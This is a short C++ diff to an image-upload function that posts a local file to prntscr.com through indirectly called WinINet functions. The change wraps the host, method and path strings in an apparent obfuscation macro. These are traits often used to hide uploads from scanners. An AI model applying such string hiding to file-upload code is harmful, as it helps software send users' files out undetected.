@@ -46,10 +46,10 @@ std::string PrntSc::UploadImage(const char* useragent, const char* file) {
     hSession = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 
     if (hSession) {
-        hConnect = g_InternetConnectA(hSession, "prntscr.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        hConnect = g_InternetConnectA(hSession, S("prntscr.com").c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 
         if (hConnect) {
-            hRequest = g_HttpOpenRequestA(hConnect, "POST", "upload.php", NULL, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 1);
+            hRequest = g_HttpOpenRequestA(hConnect, S("POST").c_str(), S("upload.php").c_str(), NULL, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 1);
 
             if (hRequest) {
                 HANDLE hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
